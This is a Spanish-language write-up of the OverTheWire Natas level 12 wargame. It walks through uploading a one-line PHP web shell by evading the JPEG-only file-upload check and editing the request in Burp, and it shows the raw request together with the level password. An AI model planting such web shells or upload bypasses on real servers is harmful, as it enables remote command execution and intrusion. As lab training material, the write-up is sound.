#Natas Level 11 → Level 12

Username: natas12

URL:      http://natas12.natas.labs.overthewire.org

##Write Up Iker

Abrimos un navegador y nos conectamos a la página: 

- **URL        : http://natas12.natas.labs.overthewire.org** 
- **Usuario    : natas12**
- **Contraseña : EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3**

La contraseña la hemos sacado del nivel anterior.

Entramos a la prueba y nos muestra un mensaje en el que nos dice que podemos subir un fichero **JPEG** pero con un **límite máximo** de **1KB**

```html
Choose a JPEG to upload (max 1KB):
```

Vamos a ver que vemos en el código fuente de la prueba:

```php
<body> 
<h1>natas12</h1> 
<div id="content"> 
<?  

function genRandomString() 
{ 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) 
    { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 
    return $string; 
} 

function makeRandomPath($dir, $ext) 
{ 
    do 
    { 
        $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) 
{ 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

  if(array_key_exists("filename", $_POST)) 
  { 
      $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
  
          if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) 
          { 
            echo "File is too big"; 
          } 
          else 
          { 
              if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) 
              { 
                  echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
              } 
              else
              { 
                  echo "There was an error uploading the file, please try again!"; 
              } 
          } 
  } 
  else 
  { 
?> 

<form enctype="multipart/form-data" action="index.php" method="POST"> 
    <input type="hidden" name="MAX_FILE_SIZE" value="1000" /> 
    <input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
Choose a JPEG to upload (max 1KB):<br/> 
    <input name="uploadedfile" type="file" /><br /> 
    <input type="submit" value="Upload File" /> 
</form> 

<? 
  } 
?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
```

Intentamos subir un fichero pero nos da un error probablemente relacionado con el tamaño del fichero (>1KB):

```html
There was an error uploading the file, please try again!
```

Parece que esta prueba trata de subir un fichero, en principio un **JPG**, que nos permita obtener la contraseña del reto. 

También hemos pensado que podemos **engañar** al sistema subiendo un fichero **php** con terminación en **JPG**. 

Algo así como esto:

```php
phpShell.php.jpg
```

El programa solamente mirará si la extensión del fichero es **JPG** y lo subirá la servidor.

Programamos una **Shell** en **PHP** muy sencilla que nos permitirá lanzar comandos en el servidor

```php
<?php
 passthru($_GET['cmd']);  
?>
```

Lo guardamos como **phpShell.php.jpg** con un tamaño de **35bytes** y lo intentamos subir. 

Con esto estaríamos pasando el filtro del **Tamaño* y el filtro de la **Extensión**

Pulsamos el botón de subir y nos sale este mensaje:

```html
The file upload/28plb5h3bh.jpg has been uploaded
```

Accedemos a la dirección y efectivamente tenemos nuestro objeto subido. Le intentamos cambiar la extensión a **.php** e introducirle algun comando, pero no responde.

```html
http://natas12.natas.labs.overthewire.org/upload/28plb5h3bh.jpg?cmd=ls 
```

ni tampoco con

```html
http://natas12.natas.labs.overthewire.org/upload/28plb5h3bh.php?cmd=ls 
```

Volvemos a leer el código fuente y nos damos cuenta que las funciones **makeRandomPathFromFilename** y **makeRandomPath** eliminan todo el texto anterior a la extensión **jpg**

Tenemos que conseguir **interceptar** el contenido que se envia y cambiarle la extensión a **.php** una vez que ha pasado el filtro de comprobación **jpg**

Para ello vamos a utilizar la herramienta **BURP** que podemos encontrar en la distro de Linux para **Pentesting** - **Kali Linux**

Configuramos el **proxy** del navegador apuntando al **localhost:8080** donde estará **BURP** escuchando para que luego podamos modificar los datos a nuestro antojo.

Subimos el fichero **phpShell.php.jpg** y luego lo cambiaremos luego con el **BURP**

Obtenemos lo siguiente:

```html
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://natas12.natas.labs.overthewire.org/
Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------17458871318756377591816066944
Content-Length: 515

-----------------------------17458871318756377591816066944
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------17458871318756377591816066944
Content-Disposition: form-data; name="filename"

phpShell.php.jpg
-----------------------------17458871318756377591816066944
Content-Disposition: form-data; name="uploadedfile"; filename="phpShell.php"
Content-Type: application/x-php

<?
passthru($GET_['cmd']);
?>
-----------------------------17458871318756377591816066944--
```


The file upload/ujofljdn2f.php has been uploaded

Notice: Undefined variable: GET_ in /var/www/natas/natas12/upload/ujofljdn2f.php on line 2

Warning: passthru(): Cannot execute a blank command in /var/www/natas/natas12/upload/ujofljdn2f.php on line 2



 












 




